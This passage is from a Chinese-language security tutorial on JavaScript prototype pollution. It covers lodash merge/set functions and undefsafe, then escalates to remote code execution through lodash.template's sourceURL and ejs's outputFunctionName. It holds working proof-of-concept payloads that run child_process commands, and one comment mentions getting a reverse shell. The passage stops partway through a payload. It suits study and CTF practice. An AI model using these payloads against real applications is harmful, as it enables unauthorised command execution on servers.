[customizer])</span></span><br></code></pre></td></tr></table></figure><p>该方法与 <code>merge</code> 方法一样存在原型链污染漏洞，下面给出一个验证漏洞的 POC：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> lodash= require(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;whoami&quot;:&quot;Vulnerable&quot;&#125;&#125;&#x27;</span>;<br><br><span class="hljs-keyword">var</span> a = &#123;&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Before whoami: &quot;</span> + a.whoami);<br>lodash.mergeWith(&#123;&#125;, JSON.parse(payload));<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;After whoami: &quot;</span> + a.whoami);<br></code></pre></td></tr></table></figure><h3 id="lodash-set-方法"><a href="#lodash-set-方法" class="headerlink" title="lodash.set 方法"></a>lodash.set 方法</h3><p>Lodash.set 方法可以用来设置值到对象对应的属性路径上，如果没有则创建这部分路径。 缺少的索引属性会创建为数组，而缺少的属性会创建为对象。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span>(<span class="hljs-keyword">object</span>, <span class="hljs-type">path</span>, <span class="hljs-keyword">value</span>)<br></code></pre></td></tr></table></figure><ul><li>示例：</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> <span class="hljs-built_in">object</span> = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><br>_.<span class="hljs-keyword">set</span>(<span class="hljs-built_in">object</span>, <span class="hljs-string">&#x27;a[0].b.c&#x27;</span>, <span class="hljs-number">4</span>);<br>console.log(<span class="hljs-built_in">object</span>.a[<span class="hljs-number">0</span>].b.c);<br><span class="hljs-comment">// =&gt; 4</span><br><br>_.<span class="hljs-keyword">set</span>(<span class="hljs-built_in">object</span>, <span class="hljs-string">&#x27;x[0].y.z&#x27;</span>, <span class="hljs-number">5</span>);<br>console.log(<span class="hljs-built_in">object</span>.x[<span class="hljs-number">0</span>].y.z);<br><span class="hljs-comment">// =&gt; 5</span><br></code></pre></td></tr></table></figure><p>在使用 Lodash.set 方法时，如果没有对传入的参数进行过滤，则可能会造成原型链污染。下面给出一个验证漏洞的 POC：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> lodash= require(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">var</span> object_1 = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><span class="hljs-keyword">var</span> object_2 = &#123;&#125;<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(object_1.whoami);<br><span class="hljs-comment">//lodash.set(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br>lodash.set(object_2, <span class="hljs-string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="hljs-string">&#x27;Vulnerable&#x27;</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(object_1.whoami);<br></code></pre></td></tr></table></figure><h3 id="lodash-setWith-方法"><a href="#lodash-setWith-方法" class="headerlink" title="lodash.setWith 方法"></a>lodash.setWith 方法</h3><p>Lodash.setWith 方法类似 <code>set</code> 方法。但是它还会接受一个 <code>customizer</code>，用来调用并决定如何设置对象路径的值。 如果 <code>customizer</code> 返回 <code>undefined</code> 将会有它的处理方法代替。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">setWith(<span class="hljs-selector-tag">object</span>, <span class="hljs-selector-tag">path</span>, value, <span class="hljs-selector-attr">[customizer]</span>)<br></code></pre></td></tr></table></figure><p>该方法与 <code>set</code> 方法一样可以进行原型链污染，下面给出一个验证漏洞的 POC：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> lodash= require(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">var</span> object_1 = &#123; <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;b&#x27;</span>: &#123; <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">3</span> &#125; &#125;] &#125;;<br><span class="hljs-keyword">var</span> object_2 = &#123;&#125;<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(object_1.whoami);<br><span class="hljs-comment">//lodash.setWith(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br>lodash.setWith(object_2, <span class="hljs-string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="hljs-string">&#x27;Vulnerable&#x27;</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(object_1.whoami);<br></code></pre></td></tr></table></figure><h2 id="Undefsafe-模块"><a href="#Undefsafe-模块" class="headerlink" title="Undefsafe 模块"></a>Undefsafe 模块</h2><p>Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞（CVE-2019-10795），攻击者可利用该漏洞添加或修改 Object.prototype 属性。</p><p>我们先简单测试一下该模块的使用，</p><p>可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">var</span> <span class="hljs-built_in">object</span> = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;skysec&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>)<span class="hljs-comment">// skysec</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">c</span>.<span class="hljs-property">e</span>)<span class="hljs-comment">// TypeError: Cannot read properties of undefined (reading &#x27;e&#x27;)</span><br></code></pre></td></tr></table></figure><p>在编程时，代码量较大时，我们可能经常会遇到类似情况，导致程序无法正常运行，发送我们最讨厌的报错。那么 undefsafe 可以帮助我们解决这个问题：</p><p>那么当我们无意间访问到对象不存在的属性时，就不会再进行报错，而是会返回 undefined 了。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">a</span>(<span class="hljs-built_in">object</span>,<span class="hljs-string">&#x27;a.b.e&#x27;</span>))<br><span class="hljs-comment">// skysec</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>)<br><span class="hljs-comment">// skysec</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">a</span>(<span class="hljs-built_in">object</span>,<span class="hljs-string">&#x27;a.c.e&#x27;</span>))<br><span class="hljs-comment">// undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">a</span>.<span class="hljs-property">c</span>.<span class="hljs-property">e</span>)<br><span class="hljs-comment">// TypeError: Cannot read property &#x27;e&#x27; of undefined</span><br></code></pre></td></tr></table></figure><p>同时在对对象赋值时，如果目标属性存在：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">var a <span class="hljs-operator">=</span> require(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br>var object <span class="hljs-operator">=</span> &#123;<br>    <span class="hljs-params">a:</span> &#123;<br>        <span class="hljs-params">b:</span> &#123;<br>            <span class="hljs-params">c:</span> <span class="hljs-number">1</span>,<br>            <span class="hljs-params">d:</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-params">e:</span> &#x27;skysec&#x27;<br>        &#125;<br>    &#125;<br>&#125;;<br>console.log(object)<br><span class="hljs-operator">//</span> &#123; <span class="hljs-params">a:</span> &#123; <span class="hljs-params">b:</span> &#123; <span class="hljs-params">c:</span> <span class="hljs-number">1</span>, <span class="hljs-params">d:</span> [Array], <span class="hljs-params">e:</span> &#x27;skysec&#x27; &#125; &#125; &#125;<br>a(object,&#x27;a.b.e&#x27;,&#x27;<span class="hljs-number">123</span>&#x27;)<br>console.log(object)<br><span class="hljs-operator">//</span> &#123; <span class="hljs-params">a:</span> &#123; <span class="hljs-params">b:</span> &#123; <span class="hljs-params">c:</span> <span class="hljs-number">1</span>, <span class="hljs-params">d:</span> [Array], <span class="hljs-params">e:</span> &#x27;<span class="hljs-number">123</span>&#x27; &#125; &#125; &#125;<br></code></pre></td></tr></table></figure><p>我们可以看到，其可以帮助我们修改对应属性的值。如果当属性不存在时，我们想对该属性赋值：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">var a <span class="hljs-operator">=</span> require(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br>var object <span class="hljs-operator">=</span> &#123;<br>    <span class="hljs-params">a:</span> &#123;<br>        <span class="hljs-params">b:</span> &#123;<br>            <span class="hljs-params">c:</span> <span class="hljs-number">1</span>,<br>            <span class="hljs-params">d:</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-params">e:</span> &#x27;skysec&#x27;<br>        &#125;<br>    &#125;<br>&#125;;<br>console.log(object)<br><span class="hljs-operator">//</span> &#123; <span class="hljs-params">a:</span> &#123; <span class="hljs-params">b:</span> &#123; <span class="hljs-params">c:</span> <span class="hljs-number">1</span>, <span class="hljs-params">d:</span> [Array], <span class="hljs-params">e:</span> &#x27;skysec&#x27; &#125; &#125; &#125;<br>a(object,&#x27;a.f.e&#x27;,&#x27;<span class="hljs-number">123</span>&#x27;)<br>console.log(object)<br><span class="hljs-operator">//</span> &#123; <span class="hljs-params">a:</span> &#123; <span class="hljs-params">b:</span> &#123; <span class="hljs-params">c:</span> <span class="hljs-number">1</span>, <span class="hljs-params">d:</span> [Array], <span class="hljs-params">e:</span> &#x27;skysec&#x27; &#125;, <span class="hljs-params">e:</span> &#x27;<span class="hljs-number">123</span>&#x27; &#125; &#125;<br></code></pre></td></tr></table></figure><p>访问属性会在上层进行创建并赋值。</p><p>再来看一个简单例子：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> a = require(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)    <span class="hljs-comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="hljs-comment">// this is [object Object]</span><br></code></pre></td></tr></table></figure><p>返回：[object Object]，并与this is进行拼接。但是当我们使用 undefsafe 的时候，可以对原型进行污染：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">a(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;just a evil!&#x27;</span>&#125;)<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)    <span class="hljs-comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="hljs-comment">// this is just a evil!</span><br></code></pre></td></tr></table></figure><p>可以看到最终输出了 “this is just a evil!”。这就是因为原型链污染导致，当我们将对象与字符串拼接时，即将对象当做字符串使用时，会自动其触发 toString 方法。但由于当前对象中没有，则回溯至原型中寻找，并发现toString方法，同时进行调用，而此时原型中的toString方法已被我们污染，因此可以导致其输出被我们污染后的结果。</p><h2 id="触发方法"><a href="#触发方法" class="headerlink" title="触发方法"></a>触发方法</h2><p>注意，上面是原型链污染过程，但是污染之后我们还得触发，这样才能利用。</p><h3 id="配合-lodash-template"><a href="#配合-lodash-template" class="headerlink" title="配合 lodash.template"></a>配合 lodash.template</h3><p>Lodash.template 是 Lodash 中的一个简单的模板引擎，创建一个预编译模板方法，可以插入数据到模板中 “interpolate” 分隔符相应的位置。 详情请看：<a href="http://lodash.think2011.net/template">http://lodash.think2011.net/template</a></p><p>在 Lodash 的原型链污染中，为了实现代码执行，我们常常会污染 template 中的 <code>sourceURL</code> 属性，即给所有 Object 对象中都插入一个 <code>sourceURL</code> 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞。</p><p>可参考<code>[Code-Breaking 2018] Thejs</code>。</p><p>示例payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//能进行命令执行，但无法控制回显，可以直接反弹shell</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;x\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-comment">//如果环境不出网，想要拿到回显就要改变Function()的返回值，直接用匿名函数返回命令执行的结果</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;x\nreturn function()&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-comment">//p牛的payload，每次污染前先复原一下Object，一个环境可以多次执行</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\u000areturn e =&gt; &#123; for (var a in &#123;&#125;) &#123; delete Object.prototype[a];&#125;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&#125;\u000a//&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceURL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;\u000areturn e =&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>为什么要污染 sourceURL 呢？我们看到 <code>lodash.template</code> 的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Use a sourceURL for easier debugging.</span><br><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">&#x27;sourceURL&#x27;</span> <span class="hljs-keyword">in</span> options ? <span class="hljs-string">&#x27;//# sourceURL=&#x27;</span> + options.<span class="hljs-property">sourceURL</span> + <span class="hljs-string">&#x27;\n&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">var</span> result = <span class="hljs-title function_">attempt</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source)<br>  .<span class="hljs-title function_">apply</span>(<span class="hljs-literal">undefined</span>, importsValues);<br>&#125;);<br></code></pre></td></tr></table></figure><p>可以看到 sourceURL 属性是通过一个三目运算法赋值，其默认值为空。再往下看可以发现 sourceURL 被拼接进 Function 函数构造器的第二个参数，造成任意代码执行漏洞。所以我们通过原型链污染 sourceURL 参数构造 chile_process.exec  就可以执行任意代码了。但是要注意，Function 环境下没有 <code>require</code> 函数，直接使用<code>require(&#39;child_process&#39;)</code> 会报错，所以我们要用 <code>global.process.mainModule.constructor._load</code> 来代替。</p><h3 id="配合-ejs-模板引擎"><a href="#配合-ejs-模板引擎" class="headerlink" title="配合 ejs 模板引擎"></a>配合 ejs 模板引擎</h3><p>Nodejs 的 ejs 模板引擎存在一个利用原型污染进行 RCE 的一个漏洞。可参考<code>[XNUCA 2019 Qualifier]Hardjs</code></p><p>示例代码：</p><ul><li>app.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">var</span> ejs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-comment">//设置模板的位置与种类</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, __dirname);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views engine&#x27;</span>,<span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-comment">//对原型进行污染</span><br><span class="hljs-keyword">var</span> malicious_payload = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;</span>;<br>lodash.<span class="hljs-title function_">merge</span>(&#123;&#125;, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(malicious_payload));<br><br><span class="hljs-comment">//进行渲染</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-property">render</span> (<span class="hljs-string">&quot;index.ejs&quot;</span>,&#123;<br>        <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;whoami test&#x27;</span><br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">//设置http</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>index.ejs</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&lt;%= message%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在 app.js 里可以得知使用的是 ejs 模板引擎</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>).<span class="hljs-property">__express</span>); <br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ejs 的 renderFile 进入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.<span class="hljs-property">renderFile</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>...<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">tryHandleCache</span>(opts, data, cb);<br>&#125;;<br></code></pre></td></tr></table></figure><p>跟进 tryHandleCache 函数, 发现一定会进入 handleCache 函数</p><p>跟进 handleCache 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleCache</span>(<span class="hljs-params">options, template</span>) &#123;<br>...<br>    func = <span class="hljs-built_in">exports</span>.<span class="hljs-title function_">compile</span>(template, options);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>然后跟进 complie 函数, 会发现有大量的渲染拼接</p><p>这里将 <code>opts.outputFunctionName</code> 拼接到 prepended 中，prepended 在最后会被传递给 this.source 并被带入函数执行。所以如果能够覆盖 <code>opts.outputFunctionName</code> , 这样我们构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE。在 ejs 中还有一个 <code>render</code> 方法，其最终也是进入了 <code>compile</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.<span class="hljs-property">outputFunctionName</span> + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br><span class="hljs-comment">// After injection</span><br>prepended += <span class="hljs-string">&#x27; var __tmp1; return global.process.mainModule.constructor._load(&#x27;</span>child_process<span class="hljs-string">&#x27;).execSync(&#x27;</span>dir<span class="hljs-string">&#x27;); __tmp2 = __append;&#x27;</span><br><span class="hljs-comment">// 拼接了命令语句</span><br></code></pre></td></tr></table></figure><p>最后给出几个 ejs 模板引擎 RCE 常用的 POC：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//命令执行，execSync</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;<br><br><span class="hljs-comment">//命令执行，exec</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var 